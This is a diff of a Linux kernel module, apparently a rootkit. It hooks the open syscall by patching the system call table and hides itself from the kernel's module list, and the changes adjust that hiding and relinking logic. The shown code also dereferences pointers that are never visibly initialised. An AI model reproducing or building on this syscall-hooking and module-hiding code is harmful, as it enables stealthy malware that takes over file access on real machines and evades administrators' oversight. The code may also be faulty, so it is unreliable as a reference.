@@ -11,8 +11,8 @@
 MODULE_LICENSE("GPL");
 
 struct list_head modules_list;
-struct list_head *p;
-struct list_head *n;
+struct list_head* p;
+struct list_head* n;
 
 char filepath[128] = { 0x0, } ;
 void ** sctable ;
@@ -32,6 +32,8 @@ asmlinkage int openhook_sys_open(const char __user * filename, int flags, umode_
 		count++ ;
 		pr_info("cat block return link\n");
 		modules_list = THIS_MODULE->list;
+		n->prev = (&modules_list);
+		p->next = (&modules_list);
 		(&modules_list)->next = n;
 		(&modules_list)->prev = p;
 		return -1 ;
@@ -112,7 +114,7 @@ int __init openhook_init(void) {
 	pr_info("name    = %s\n", THIS_MODULE->name);
     	pr_info("version = %s\n", THIS_MODULE->version);
 	sctable = (void *) kallsyms_lookup_name("sys_call_table") ;
-	list_del_init(&__this_module.list); 
+	list_del_init(&modules_list); 
 	orig_sys_open = sctable[__NR_open] ;
 	pte = lookup_address((unsigned long) sctable, &level) ;
 	if (pte->pte &~ _PAGE_RW) 
